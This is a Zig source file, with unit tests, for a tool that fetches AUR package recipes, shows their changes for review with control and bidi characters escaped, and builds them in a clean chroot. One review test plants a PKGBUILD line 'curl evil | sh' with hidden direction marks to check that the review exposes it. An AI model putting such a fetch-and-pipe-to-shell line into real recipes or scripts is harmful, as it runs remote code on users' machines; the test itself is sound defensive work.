//! packages from the aur. `os update` fetches each one's recipe with git,
//! shows what changed since the locked commit for review, builds it in a
//! clean chroot with devtools' makechrootpkg, and adds the result to a
//! local repository, `yoq-aur`, that resolution reads like any other.
//! every function that changes something returns null when it worked, or
//! what went wrong.

const std = @import("std");
const exec = @import("exec.zig");
const lists = @import("lists.zig");
const rootfs = @import("rootfs.zig");
const lock = @import("lock.zig");
const sync = @import("sync.zig");
const Allocator = std.mem.Allocator;

/// the local repository's name, as pacman and the lock see it.
pub const repo_name = "yoq-aur";

/// the unprivileged user recipes build as, inside the chroot.
pub const build_user = "yoq-build";

/// the local repository's directory on the machine.
pub const repo_dir = "/var/cache/yoq/aur/repo";

/// where the aur's recipes come from, unless the context says otherwise.
pub const default_url = "https://aur.archlinux.org";

/// what a recipe's .SRCINFO says about what it builds and needs.
pub const SrcInfo = struct {
    pkgbase: []const u8,
    pkgver: []const u8 = "",
    pkgrel: []const u8 = "",
    /// the packages it builds: one, or several for a split package.
    pkgnames: []const []const u8 = &.{},
    /// what it needs to build, and what the package named after the recipe
    /// needs to run, by name, without version bounds.
    needs: []const []const u8 = &.{},
    /// the names the package named after the recipe provides, besides its
    /// own.
    provides: []const []const u8 = &.{},
    /// the recipe commit this came from, once fetched.
    commit: []const u8 = "",
};

pub fn parseSrcInfo(a: Allocator, text: []const u8) !?SrcInfo {
    var out: SrcInfo = .{ .pkgbase = "" };
    var names: std.ArrayList([]const u8) = .empty;
    var needs: std.ArrayList([]const u8) = .empty;
    var provides: std.ArrayList([]const u8) = .empty;
    // "" in the pkgbase part, then the package whose part it is. a split
    // package's other parts say what those packages need, which os doesn't
    // install.
    var part: []const u8 = "";
    var lines = std.mem.splitScalar(u8, text, '\n');
    while (lines.next()) |raw| {
        const line = std.mem.trim(u8, raw, " \t\r");
        const eq = std.mem.indexOf(u8, line, " = ") orelse continue;
        const key = line[0..eq];
        const value = line[eq + 3 ..];
        if (std.mem.eql(u8, key, "pkgbase")) out.pkgbase = value;
        if (std.mem.eql(u8, key, "pkgver")) out.pkgver = value;
        if (std.mem.eql(u8, key, "pkgrel")) out.pkgrel = value;
        if (std.mem.eql(u8, key, "pkgname")) {
            try names.append(a, value);
            part = value;
        }
        const ours = part.len == 0 or std.mem.eql(u8, part, out.pkgbase);
        const name = value[0 .. std.mem.indexOfAny(u8, value, "<>=:") orelse value.len];
        // depends_x86_64 and the like count too.
        const kinds: []const []const u8 = if (part.len == 0) &.{ "depends", "makedepends", "checkdepends" } else &.{"depends"};
        for (kinds) |k| {
            if (ours and std.mem.startsWith(u8, key, k) and !lists.contains(needs.items, name)) try needs.append(a, name);
        }
        if (ours and std.mem.startsWith(u8, key, "provides") and !lists.contains(provides.items, name)) try provides.append(a, name);
    }
    if (out.pkgbase.len == 0) return null;
    out.pkgnames = names.items;
    out.needs = needs.items;
    out.provides = provides.items;
    return out;
}

/// what's wrong with building the recipe fetched for `name`, or null if
/// nothing is. the build's paths come from pkgbase, so it has to be the
/// recipe that was fetched and reviewed, and os installs only the package
/// named after the recipe, so it has to build one.
pub fn nameProblem(a: Allocator, name: []const u8, info: SrcInfo) !?[]const u8 {
    if (!std.mem.eql(u8, info.pkgbase, name)) {
        return try std.fmt.allocPrint(a, "{s}'s recipe says its pkgbase is {s}. os builds a recipe only under its own name.", .{ name, info.pkgbase });
    }
    if (!lists.contains(info.pkgnames, name)) {
        return try std.fmt.allocPrint(a, "{s}'s recipe is a split package that builds {s}, but none of them is {s}. os installs only the package named after its recipe, so it can't use this one.", .{ name, try std.mem.join(a, ", ", info.pkgnames), name });
    }
    return null;
}

/// what an aur recipe needs that no sync database and no other recipe has.
pub const Missing = struct {
    need: []const u8,
    /// the recipe that needs it.
    by: []const u8,
    /// the recipe among them that splits it off, which os doesn't install.
    split_from: ?[]const u8 = null,
};

/// the needs of `recipes` that are in `unresolvable`, the names no sync
/// database has, and that no recipe among them installs either.
pub fn missingNeeds(a: Allocator, recipes: []const SrcInfo, unresolvable: []const []const u8) ![]const Missing {
    var out: std.ArrayList(Missing) = .empty;
    for (recipes) |r| {
        for (r.needs) |n| {
            if (!lists.contains(unresolvable, n) or providerOf(recipes, n) != null) continue;
            const split_from = for (recipes) |q| {
                if (lists.contains(q.pkgnames, n)) break q.pkgbase;
            } else null;
            try out.append(a, .{ .need = n, .by = r.pkgbase, .split_from = split_from });
        }
    }
    return out.items;
}

/// `recipes` ordered so each comes after the ones among them it needs.
/// returns null, with the loop's names in `why`, if they need each other.
pub fn buildOrder(a: Allocator, recipes: []const SrcInfo, why: *[]const u8) !?[]const SrcInfo {
    var out: std.ArrayList(SrcInfo) = .empty;
    var done: std.ArrayList([]const u8) = .empty;
    while (out.items.len < recipes.len) {
        var progressed = false;
        for (recipes) |r| {
            if (lists.contains(done.items, r.pkgbase)) continue;
            const ready = for (r.needs) |n| {
                const from = providerOf(recipes, n) orelse continue;
                if (!std.mem.eql(u8, from, r.pkgbase) and !lists.contains(done.items, from)) break false;
            } else true;
            if (!ready) continue;
            try out.append(a, r);
            try done.append(a, r.pkgbase);
            progressed = true;
        }
        if (!progressed) {
            var left: std.ArrayList([]const u8) = .empty;
            for (recipes) |r| {
                if (!lists.contains(done.items, r.pkgbase)) try left.append(a, r.pkgbase);
            }
            why.* = try std.mem.join(a, ", ", left.items);
            return null;
        }
    }
    return out.items;
}

/// the aur packages among `recipes` that `r` needs, for installing into
/// the chroot before it builds.
pub fn aurNeeds(a: Allocator, recipes: []const SrcInfo, r: SrcInfo) ![]const []const u8 {
    var out: std.ArrayList([]const u8) = .empty;
    for (r.needs) |n| {
        const from = providerOf(recipes, n) orelse continue;
        if (!std.mem.eql(u8, from, r.pkgbase) and !lists.contains(out.items, from)) try out.append(a, from);
    }
    return out.items;
}

/// the recipe among `recipes` whose package is `name` or provides it. a
/// recipe's package is the one named after it, its pkgbase: the other
/// packages a split recipe builds aren't installed.
fn providerOf(recipes: []const SrcInfo, name: []const u8) ?[]const u8 {
    for (recipes) |r| {
        if (std.mem.eql(u8, r.pkgbase, name) or lists.contains(r.provides, name)) return r.pkgbase;
    }
    return null;
}

/// the pacman.conf builds use inside the chroot: `repos`, the ones the
/// lock resolves against, with their servers written out. arch-nspawn
/// rewrites the chroot's mirrorlist from the host's on every run, so
/// servers in the mirrorlist would build against today's packages even
/// for a lock from an earlier day. repositories on this machine's disk are
/// left out: the chroot can't see them, and aur packages a build needs go
/// in with `-I`.
pub fn chrootPacmanConf(a: Allocator, repos: []const sync.Repo) ![]const u8 {
    var out: std.ArrayList(u8) = .empty;
    // LocalFileSigLevel is for the aur packages -I installs, which os built
    // and didn't sign.
    try out.appendSlice(a, "[options]\nArchitecture = auto\nSigLevel = Required DatabaseOptional\nLocalFileSigLevel = Optional\n");
    for (repos) |r| {
        if (r.local or sync.servedFromDisk(r)) continue;
        try out.print(a, "\n[{s}]\n", .{r.name});
        if (!r.signed) try out.appendSlice(a, "SigLevel = Optional TrustAll\n");
        for (sync.serversOf(r)) |server| try out.print(a, "Server = {s}\n", .{server});
    }
    return out.items;
}

/// the directories os keeps aur work in, under a machine's root.
pub const Dirs = struct {
    /// the recipes, one git clone each, and build logs.
    src: []const u8,
    /// a copy of each recipe to build in, owned by the build user.
    build: []const u8,
    /// the chroot builds run in.
    chroot: []const u8,
    /// the local repository: built packages and yoq-aur.db.
    repo: []const u8,

    pub fn under(a: Allocator, root: []const u8) !Dirs {
        const base = try std.fs.path.join(a, &.{ root, "var/cache/yoq/aur" });
        return .{
            .src = try std.fs.path.join(a, &.{ base, "src" }),
            .build = try std.fs.path.join(a, &.{ base, "build" }),
            .chroot = try std.fs.path.join(a, &.{ base, "chroot" }),
            .repo = try std.fs.path.join(a, &.{ root, repo_dir }),
        };
    }
};

/// `text` with control characters other than newlines and tabs written
/// as escapes, like "\\x1b", and so are the c1 controls in utf-8 and the
/// marks that reverse the direction text shows in, like u+202e. with
/// those, a line of a recipe could show as something it doesn't say.
fn visible(a: Allocator, text: []const u8) ![]const u8 {
    var out: std.ArrayList(u8) = .empty;
    var i: usize = 0;
    while (i < text.len) : (i += 1) {
        const ch = text[i];
        if ((ch < 0x20 and ch != '\n' and ch != '\t') or ch == 0x7f) {
            try out.print(a, "\\x{x:0>2}", .{ch});
        } else if (ch == 0xc2 and i + 1 < text.len and text[i + 1] >= 0x80 and text[i + 1] <= 0x9f) {
            try out.print(a, "\\u{x:0>4}", .{text[i + 1]});
            i += 1;
        } else if (bidiMark(text[i..])) |cp| {
            try out.print(a, "\\u{x:0>4}", .{cp});
            i += 2;
        } else try out.append(a, ch);
    }
    return out.items;
}

/// the code point of the bidi control `text` starts with, in utf-8:
/// u+200e and u+200f, u+202a to u+202e, and u+2066 to u+2069.
fn bidiMark(text: []const u8) ?u21 {
    if (text.len < 3 or text[0] != 0xe2) return null;
    const cp = std.unicode.utf8Decode(text[0..3]) catch return null;
    return switch (cp) {
        0x200e, 0x200f, 0x202a...0x202e, 0x2066...0x2069 => cp,
        else => null,
    };
}

/// the aur's recipes, fetched and built on a machine.
pub const Builder = struct {
    a: Allocator,
    io: std.Io,
    dirs: Dirs,
    /// the aur's address, or a stand-in, like a local directory in tests.
    url: []const u8 = default_url,
    /// the chroot's pacman.conf, from `chrootPacmanConf`.
    pacman_conf: []const u8,

    fn recipeDir(b: Builder, name: []const u8) ![]const u8 {
        return std.fs.path.join(b.a, &.{ b.dirs.src, name });
    }

    /// clones or fetches `name`'s recipe. returns the newest commit, or
    /// null with the reason in `why`.
    pub fn fetch(b: Builder, name: []const u8, why: *[]const u8) !?[]const u8 {
        const dir = try b.recipeDir(name);
        if (rootfs.pathExists(b.io, try std.fs.path.join(b.a, &.{ dir, ".git" }))) {
            if (try b.git(&.{ "-C", dir, "fetch", "-q", "origin" })) |w| return fail(why, w);
        } else {
            if (try b.createDir(b.dirs.src)) |w| return fail(why, w);
            const url = try std.fmt.allocPrint(b.a, "{s}/{s}.git", .{ b.url, name });
            if (try b.git(&.{ "clone", "-q", url, dir })) |w| return fail(why, w);
        }
        // the remote's newest commit, after a clone or a fetch alike.
        const out = try b.gitOutput(&.{ "-C", dir, "rev-parse", "origin/HEAD" }) orelse
            return fail(why, try std.fmt.allocPrint(b.a, "{s}'s recipe has no commits: is it on the aur?", .{name}));
        const commit = std.mem.trim(u8, out, " \n");
        if (!lock.validCommit(commit)) return fail(why, try std.fmt.allocPrint(b.a, "{s}'s recipe gave a commit that isn't one: {s}", .{ name, commit }));
        return commit;
    }

    /// the recipe's .SRCINFO at `commit`, with the commit.
    pub fn srcInfo(b: Builder, name: []const u8, commit: []const u8) !?SrcInfo {
        const text = try b.gitOutput(&.{ "-C", try b.recipeDir(name), "show", try std.fmt.allocPrint(b.a, "{s}:.SRCINFO", .{commit}) }) orelse return null;
        var info = try parseSrcInfo(b.a, text) orelse return null;
        info.commit = commit;
        return info;
    }

    /// what to review before building `commit`: what changed since
    /// `from`, or for a recipe never built, every file in it whole, since
    /// any of them can run. binary files are only named. control
    /// characters show as escapes, so nothing in a recipe can move the
    /// terminal's cursor and hide a line from the review.
    pub fn review(b: Builder, name: []const u8, from: ?[]const u8, commit: []const u8) ![]const u8 {
        const dir = try b.recipeDir(name);
        if (from) |f| {
            // every change as text, whatever the recipe's own
            // .gitattributes says: one that marks the PKGBUILD -diff
            // would show its change as "Binary files differ".
            if (try b.gitOutput(&.{ "-C", dir, "diff", "--text", "--no-textconv", "--no-ext-diff", "--stat", "-p", f, commit, "--", "." })) |d| return visible(b.a, d);
        }
        // -z, so a name git would quote, like one with an é, comes back
        // as it is, and its file can be shown.
        const tree = try b.gitOutput(&.{ "-C", dir, "ls-tree", "-r", "-z", commit }) orelse "";
        var files: std.ArrayList(u8) = .empty;
        var shown: std.ArrayList(u8) = .empty;
        var entries = std.mem.tokenizeScalar(u8, tree, 0);
        while (entries.next()) |entry| {
            // "<mode> <type> <object>\t<name>".
            const tab = std.mem.indexOfScalar(u8, entry, '\t') orelse continue;
            const f = entry[tab + 1 ..];
            try files.print(b.a, "{s}\n", .{f});
            const text = try b.gitOutput(&.{ "-C", dir, "show", try std.fmt.allocPrint(b.a, "{s}:{s}", .{ commit, f }) }) orelse {
                try shown.print(b.a, "\n--- {s} (git can't show it)\n", .{f});
                continue;
            };
            if (std.mem.startsWith(u8, entry, "120000 ")) {
                try shown.print(b.a, "\n--- {s} (a symlink to {s})\n", .{ f, text });
            } else if (std.mem.indexOfScalar(u8, text, 0) != null) {
                try shown.print(b.a, "\n--- {s} (binary, {d} bytes)\n", .{ f, text.len });
            } else try shown.print(b.a, "\n--- {s}\n{s}", .{ f, text });
        }
        return visible(b.a, try std.fmt.allocPrint(b.a, "files in the recipe:\n{s}{s}", .{ files.items, shown.items }));
    }

    /// builds the recipe `info` names, at its commit, in the chroot, with
    /// `needs`, aur packages from the local repository, installed there
    /// first, and adds what it builds to the local repository. a commit
    /// built before isn't built again.
    pub fn build(b: Builder, info: SrcInfo, needs: []const []const u8) !?[]const u8 {
        const name = info.pkgbase;
        const commit = info.commit;
        const with = try b.packageFiles(needs);
        const marker = try std.fmt.allocPrint(b.a, "{s}/.built/{s}-{s}", .{ b.dirs.repo, name, commit });
        if (rootfs.pathExists(b.io, marker)) return null;
        const dir = try b.recipeDir(name);
        if (try b.git(&.{ "-C", dir, "checkout", "-q", "--detach", commit })) |w| return w;
        if (try b.git(&.{ "-C", dir, "clean", "-q", "-fdx" })) |w| return w;
        // one chroot for every build, with base-devel, made once. its
        // pacman.conf is written again for each build, since the lock's
        // date moves, and -u below brings its packages to that date.
        const chroot_root = try std.fs.path.join(b.a, &.{ b.dirs.chroot, "root" });
        const conf = try std.fs.path.join(b.a, &.{ b.dirs.chroot, "pacman.conf" });
        if (try b.createDir(b.dirs.chroot)) |w| return w;
        if (try b.write(conf, b.pacman_conf)) |w| return w;
        if (!rootfs.pathExists(b.io, chroot_root)) {
            if (try b.run(&.{ "mkarchroot", "-C", conf, chroot_root, "base-devel" })) |w| return w;
        }
        if (try b.write(try std.fs.path.join(b.a, &.{ chroot_root, "etc/pacman.conf" }), b.pacman_conf)) |w| return w;
        // makechrootpkg won't build as root; it builds as this user.
        if (try b.run(&.{ "id", "-u", build_user }) != null) {
            if (try b.run(&.{ "useradd", "--system", "--no-create-home", "--shell", "/usr/bin/nologin", build_user })) |w| return w;
        }
        // the build user writes where it builds, so it gets a copy of the
        // recipe of its own; the clone stays root's, as git wants.
        const work = try std.fs.path.join(b.a, &.{ b.dirs.build, name });
        if (try b.run(&.{ "rm", "-rf", work })) |w| return w;
        if (try b.createDir(b.dirs.build)) |w| return w;
        if (try b.run(&.{ "cp", "-a", dir, work })) |w| return w;
        // gone once the build ends: its files are the build user's, who
        // could leave a program there, set-uid to it, for anyone to run,
        // and with it change the next build's files before it starts.
        defer _ = b.run(&.{ "rm", "-rf", work }) catch {};
        // a package file the recipe commits would be taken for the one
        // it builds, and the review only named it.
        if (try b.dropPackages(work)) |w| return w;
        if (try b.run(&.{ "chown", "-R", build_user, work })) |w| return w;
        var argv: std.ArrayList([]const u8) = .empty;
        // -c starts from a clean copy of the chroot; -u brings it up to date.
        try argv.appendSlice(b.a, &.{ "env", "-C", work, "makechrootpkg", "-c", "-u", "-U", build_user, "-r", b.dirs.chroot });
        for (with) |pkg| try argv.appendSlice(b.a, &.{ "-I", pkg });
        const log = try std.fmt.allocPrint(b.a, "{s}/{s}.log", .{ b.dirs.src, name });
        if (try exec.runLogged(b.a, b.io, argv.items, log)) |w| return w;
        // what it built lands beside the recipe. only the package named
        // after it goes into the repository: not a split recipe's others,
        // nor a -debug package, which the config didn't ask for.
        if (try b.createDir(try std.fs.path.join(b.a, &.{ b.dirs.repo, ".built" }))) |w| return w;
        const file = ownPackage(try b.packagesIn(work), name) orelse
            return try std.fmt.allocPrint(b.a, "building {s} made no package called {s}", .{ name, name });
        const db = try std.fmt.allocPrint(b.a, "{s}/{s}.db.tar.gz", .{ b.dirs.repo, repo_name });
        const dest = try std.fs.path.join(b.a, &.{ b.dirs.repo, std.fs.path.basename(file) });
        if (try b.run(&.{ "mv", "-f", file, dest })) |w| return w;
        if (try b.run(&.{ "repo-add", "-q", "-R", db, dest })) |w| return w;
        return b.write(marker, commit);
    }

    /// the package files in the local repository that `names` are in, for
    /// installing into the chroot before a build that needs them.
    fn packageFiles(b: Builder, names: []const []const u8) ![]const []const u8 {
        var out: std.ArrayList([]const u8) = .empty;
        for (try b.packagesIn(b.dirs.repo)) |file| {
            const pn = packageName(std.fs.path.basename(file)) orelse continue;
            if (lists.contains(names, pn)) try out.append(b.a, file);
        }
        return out.items;
    }

    /// removes the package files in `dir`. null when it worked.
    fn dropPackages(b: Builder, dir: []const u8) !?[]const u8 {
        for (try b.packagesIn(dir)) |f| {
            std.Io.Dir.cwd().deleteFile(b.io, f) catch return try std.fmt.allocPrint(b.a, "can't remove {s}", .{f});
        }
        return null;
    }

    fn packagesIn(b: Builder, dir_path: []const u8) ![]const []const u8 {
        var out: std.ArrayList([]const u8) = .empty;
        var dir = std.Io.Dir.cwd().openDir(b.io, dir_path, .{ .iterate = true }) catch return out.items;
        defer dir.close(b.io);
        var it = dir.iterate();
        while (it.next(b.io) catch null) |f| {
            if (f.kind == .file and std.mem.indexOf(u8, f.name, ".pkg.tar") != null and !std.mem.endsWith(u8, f.name, ".sig")) {
                try out.append(b.a, try std.fs.path.join(b.a, &.{ dir_path, f.name }));
            }
        }
        lists.sortStrings(out.items);
        return out.items;
    }

    fn write(b: Builder, path: []const u8, text: []const u8) !?[]const u8 {
        rootfs.writeAtomic(b.io, path, text, null) catch return try std.fmt.allocPrint(b.a, "can't write {s}", .{path});
        return null;
    }

    /// makes `path` and its parents. null when it worked.
    fn createDir(b: Builder, path: []const u8) !?[]const u8 {
        std.Io.Dir.cwd().createDirPath(b.io, path) catch return try std.fmt.allocPrint(b.a, "can't create {s}", .{path});
        return null;
    }

    fn git(b: Builder, args: []const []const u8) !?[]const u8 {
        return b.run(try b.gitArgv(args));
    }

    /// what git printed, or null if it failed.
    fn gitOutput(b: Builder, args: []const []const u8) !?[]const u8 {
        return switch (try exec.output(b.a, b.io, try b.gitArgv(args))) {
            .ok => |t| t,
            .failed => null,
        };
    }

    fn gitArgv(b: Builder, args: []const []const u8) ![]const []const u8 {
        return std.mem.concat(b.a, []const u8, &.{ &.{"git"}, args });
    }

    fn run(b: Builder, argv: []const []const u8) !?[]const u8 {
        return exec.run(b.a, b.io, argv);
    }
};

/// a package file's name part, what's left before the last three dashes:
/// "yay-bin-12.5.0-1-x86_64.pkg.tar.zst" is "yay-bin".
pub fn packageName(file: []const u8) ?[]const u8 {
    const end = std.mem.indexOf(u8, file, ".pkg.tar") orelse return null;
    var stem = file[0..end];
    for (0..3) |_| stem = stem[0 .. std.mem.lastIndexOfScalar(u8, stem, '-') orelse return null];
    return stem;
}

/// the file among `files` that holds the package `name`.
fn ownPackage(files: []const []const u8, name: []const u8) ?[]const u8 {
    for (files) |f| {
        if (std.mem.eql(u8, packageName(std.fs.path.basename(f)) orelse continue, name)) return f;
    }
    return null;
}

fn fail(why: *[]const u8, message: []const u8) ?[]const u8 {
    why.* = message;
    return null;
}

// -- tests --

const testing = std.testing;

test "what a .SRCINFO builds and needs" {
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const info = (try parseSrcInfo(arena.allocator(),
        \\pkgbase = yay
        \\    pkgdesc = yet another yogurt
        \\    pkgver = 12.5.0
        \\    pkgrel = 1
        \\    makedepends = go>=1.21
        \\    depends = pacman>6.1
        \\    depends = git
        \\    depends_x86_64 = glibc
        \\
        \\pkgname = yay
        \\
    )).?;
    try testing.expectEqualStrings("yay", info.pkgbase);
    try testing.expectEqualStrings("12.5.0", info.pkgver);
    try testing.expectEqual(1, info.pkgnames.len);
    try testing.expectEqual(4, info.needs.len);
    try testing.expectEqualStrings("go", info.needs[0]);
    try testing.expectEqualStrings("glibc", info.needs[3]);
    try testing.expectEqual(null, try parseSrcInfo(arena.allocator(), "no recipe here"));

    // a split package: what the others need doesn't count.
    const split = (try parseSrcInfo(arena.allocator(),
        \\pkgbase = foo
        \\    pkgver = 1
        \\    makedepends = cmake
        \\    depends = glibc
        \\    provides = foo-api
        \\
        \\pkgname = foo
        \\    depends = foo-common
        \\    depends = libbar>=2
        \\    provides = libfoo.so=1-64
        \\
        \\pkgname = foo-common
        \\    depends = only-common
        \\
    )).?;
    try testing.expectEqual(2, split.pkgnames.len);
    const needs = [_][]const u8{ "cmake", "glibc", "foo-common", "libbar" };
    try testing.expectEqual(needs.len, split.needs.len);
    for (needs, split.needs) |want, got| try testing.expectEqualStrings(want, got);
    try testing.expectEqual(2, split.provides.len);
    try testing.expectEqualStrings("libfoo.so", split.provides[1]);
}

test "aur needs no repository or recipe has" {
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const app: SrcInfo = .{ .pkgbase = "app", .pkgnames = &.{"app"}, .needs = &.{ "lib", "libapi", "glibc", "helper", "lib-extra" } };
    const lib: SrcInfo = .{ .pkgbase = "lib", .pkgnames = &.{ "lib", "lib-extra" }, .provides = &.{"libapi"} };
    const recipes = [_]SrcInfo{ app, lib };
    // glibc is in a sync database; the rest aren't. lib-extra is lib's
    // recipe's, but os installs only lib from it.
    const missing = try missingNeeds(a, &recipes, &.{ "lib", "libapi", "helper", "lib-extra" });
    try testing.expectEqual(2, missing.len);
    try testing.expectEqualStrings("helper", missing[0].need);
    try testing.expectEqualStrings("app", missing[0].by);
    try testing.expectEqual(null, missing[0].split_from);
    try testing.expectEqualStrings("lib-extra", missing[1].need);
    try testing.expectEqualStrings("lib", missing[1].split_from.?);
    try testing.expectEqual(0, (try missingNeeds(a, &recipes, &.{})).len);

    // what goes into the chroot before app builds: lib, by name and for
    // what it provides, once.
    const with = try aurNeeds(a, &recipes, app);
    try testing.expectEqual(1, with.len);
    try testing.expectEqualStrings("lib", with[0]);
}

test "a recipe builds only the package named after it" {
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    try testing.expectEqual(null, try nameProblem(a, "foo", .{ .pkgbase = "foo", .pkgnames = &.{ "foo", "foo-common" } }));
    try testing.expectEqualStrings(
        "foo's recipe says its pkgbase is bar. os builds a recipe only under its own name.",
        (try nameProblem(a, "foo", .{ .pkgbase = "bar", .pkgnames = &.{"foo"} })).?,
    );
    try testing.expectEqualStrings(
        "foo's recipe is a split package that builds foo-cli, foo-gui, but none of them is foo. os installs only the package named after its recipe, so it can't use this one.",
        (try nameProblem(a, "foo", .{ .pkgbase = "foo", .pkgnames = &.{ "foo-cli", "foo-gui" } })).?,
    );
}

test "the package named after a recipe, among what it built" {
    const built = [_][]const u8{ "foo-common-1-1-any.pkg.tar.zst", "foo-debug-1-1-x86_64.pkg.tar.zst", "foo-1-1-x86_64.pkg.tar.zst" };
    try testing.expectEqualStrings("foo-1-1-x86_64.pkg.tar.zst", ownPackage(&built, "foo").?);
    try testing.expectEqual(null, ownPackage(built[0..2], "foo"));
}

test "aur packages build after the aur packages they need" {
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const app: SrcInfo = .{ .pkgbase = "app", .pkgnames = &.{"app"}, .needs = &.{ "libapi", "glibc" } };
    const lib: SrcInfo = .{ .pkgbase = "lib", .pkgnames = &.{ "lib", "lib-b" }, .needs = &.{"glibc"}, .provides = &.{"libapi"} };
    var why: []const u8 = "";
    const order = (try buildOrder(a, &.{ app, lib }, &why)).?;
    try testing.expectEqualStrings("lib", order[0].pkgbase);
    try testing.expectEqualStrings("app", order[1].pkgbase);

    const x: SrcInfo = .{ .pkgbase = "x", .pkgnames = &.{"x"}, .needs = &.{"y"} };
    const y: SrcInfo = .{ .pkgbase = "y", .pkgnames = &.{"y"}, .needs = &.{"x"} };
    try testing.expectEqual(null, try buildOrder(a, &.{ x, y }, &why));
    try testing.expectEqualStrings("x, y", why);
}

test "the chroot builds from the lock's servers" {
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const repos = [_]sync.Repo{
        .{ .name = "core", .servers = &.{"https://m.example/$repo/os/$arch"} },
        .{ .name = "extra", .servers = &.{} },
        .{ .name = "omarchy", .servers = &.{"https://pkgs.example/$arch"}, .signed = false },
        .{ .name = "mine", .servers = &.{"file:///srv/mine"} },
        .{ .name = repo_name, .servers = &.{"file:///var/cache/yoq/aur/repo"}, .signed = false, .local = true },
    };
    // a lock from an earlier day: arch's own repositories from the archive.
    try testing.expectEqualStrings(
        \\[options]
        \\Architecture = auto
        \\SigLevel = Required DatabaseOptional
        \\LocalFileSigLevel = Optional
        \\
        \\[core]
        \\Server = https://archive.archlinux.org/repos/2026/09/20/$repo/os/$arch
        \\
        \\[extra]
        \\Server = https://archive.archlinux.org/repos/2026/09/20/$repo/os/$arch
        \\
        \\[omarchy]
        \\SigLevel = Optional TrustAll
        \\Server = https://pkgs.example/$arch
        \\
    , try chrootPacmanConf(a, try sync.archived(a, &repos, "2026-09-20")));
    // today's: the machine's own servers, or arch's fallback.
    const now = try chrootPacmanConf(a, &repos);
    try testing.expect(std.mem.indexOf(u8, now, "[core]\nServer = https://m.example/$repo/os/$arch\n") != null);
    try testing.expect(std.mem.indexOf(u8, now, "[extra]\nServer = https://geo.mirror.pkgbuild.com/$repo/os/$arch\n") != null);
}

test "a package file's name" {
    try testing.expectEqualStrings("yay-bin", packageName("yay-bin-12.5.0-1-x86_64.pkg.tar.zst").?);
    try testing.expectEqualStrings("lib-a", packageName("lib-a-1:2.0-3-any.pkg.tar.xz").?);
    try testing.expectEqual(null, packageName("yoq-aur.db.tar.gz"));
}

/// a git repository at `dir`, standing in for a recipe on the aur, and a
/// commit there of `files`. its id, or null without git.
const Recipe = struct {
    a: Allocator,
    io: std.Io,
    dir: []const u8,

    fn git(r: Recipe, args: []const []const u8) !?[]const u8 {
        const argv = try std.mem.concat(r.a, []const u8, &.{ &.{ "git", "-C", r.dir, "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false" }, args });
        return switch (try exec.output(r.a, r.io, argv)) {
            .ok => |t| std.mem.trim(u8, t, " \n"),
            .failed => null,
        };
    }

    fn commit(r: Recipe, files: []const [2][]const u8) ![]const u8 {
        for (files) |f| try std.Io.Dir.cwd().writeFile(r.io, .{ .sub_path = try std.fs.path.join(r.a, &.{ r.dir, f[0] }), .data = f[1] });
        _ = try r.git(&.{ "add", "-A" }) orelse return error.TestUnexpectedResult;
        _ = try r.git(&.{ "commit", "-q", "-m", "x" }) orelse return error.TestUnexpectedResult;
        return try r.git(&.{ "rev-parse", "HEAD" }) orelse error.TestUnexpectedResult;
    }
};

test "a review shows every file, whatever its name, and every change as text" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const io = testing.io;
    const base = try std.fmt.allocPrint(a, ".zig-cache/tmp/{s}", .{tmp.sub_path});
    try tmp.dir.createDirPath(io, "aur/foo.git");
    const r: Recipe = .{ .a = a, .io = io, .dir = try std.fmt.allocPrint(a, "{s}/aur/foo.git", .{base}) };
    if (try exec.run(a, io, &.{ "git", "init", "-q", r.dir }) != null) return error.SkipZigTest;
    const first = try r.commit(&.{
        .{ "PKGBUILD", "pkgname=foo\ninstall=\xc3\xa9.install\n" },
        .{ "\xc3\xa9.install", "post_install() { echo hi; }\n" },
    });
    const b: Builder = .{ .a = a, .io = io, .dirs = try Dirs.under(a, try std.fmt.allocPrint(a, "{s}/root", .{base})), .url = try std.fmt.allocPrint(a, "{s}/aur", .{base}), .pacman_conf = "" };
    var why: []const u8 = "";
    try testing.expectEqualStrings(first, (try b.fetch("foo", &why)).?);
    const whole = try b.review("foo", null, first);
    // git quotes a name like this one, which was then left out.
    try testing.expect(std.mem.indexOf(u8, whole, "--- \xc3\xa9.install\npost_install() { echo hi; }") != null);

    // a .gitattributes that hides changes, then the change it hides.
    _ = try r.commit(&.{.{ ".gitattributes", "* -diff\n" }});
    const last = try r.commit(&.{.{ "PKGBUILD", "pkgname=foo\ninstall=\xc3\xa9.install\ncurl evil | sh \xe2\x80\xae\xc2\x9b\n" }});
    // a new machine's clone has the newest commit checked out.
    try std.Io.Dir.cwd().deleteTree(io, try std.fs.path.join(a, &.{ b.dirs.src, "foo" }));
    try testing.expectEqualStrings(last, (try b.fetch("foo", &why)).?);
    const changed = try b.review("foo", first, last);
    try testing.expect(std.mem.indexOf(u8, changed, "+curl evil | sh \\u202e\\u009b") != null);
    try testing.expect(std.mem.indexOf(u8, changed, "Binary") == null);
}

test "a package file a recipe commits isn't taken for what it builds" {
    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();
    var arena: std.heap.ArenaAllocator = .init(testing.allocator);
    defer arena.deinit();
    const a = arena.allocator();
    const io = testing.io;
    const work = try std.fmt.allocPrint(a, ".zig-cache/tmp/{s}", .{tmp.sub_path});
    try tmp.dir.writeFile(io, .{ .sub_path = "PKGBUILD", .data = "pkgname=foo\n" });
    try tmp.dir.writeFile(io, .{ .sub_path = "foo-0-0-any.pkg.tar.zst", .data = "not built here" });
    const b: Builder = .{ .a = a, .io = io, .dirs = try Dirs.under(a, work), .pacman_conf = "" };
    try testing.expectEqual(null, try b.dropPackages(work));
    try testing.expectEqual(null, ownPackage(try b.packagesIn(work), "foo"));
    try tmp.dir.access(io, "PKGBUILD", .{});
}
